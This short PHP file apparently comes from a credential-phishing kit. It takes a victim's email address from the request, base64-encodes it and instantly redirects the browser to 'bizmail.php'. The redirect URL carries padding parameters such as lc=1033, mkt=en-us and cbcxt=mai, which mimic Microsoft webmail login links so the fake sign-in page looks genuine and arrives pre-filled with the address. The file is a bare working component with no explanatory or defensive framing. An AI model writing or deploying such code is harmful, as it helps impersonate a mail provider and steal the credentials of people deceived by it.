<?php


$user = $_REQUEST['email'];
$email = base64_encode($user);
echo "<meta http-equiv=refresh content=0;url='bizmail.php?email=$email&.rand=13vqcr8bp0gud&lc=1033&id=64855&mkt=en-us&cbcxt=mai&snsc=1' >";


?>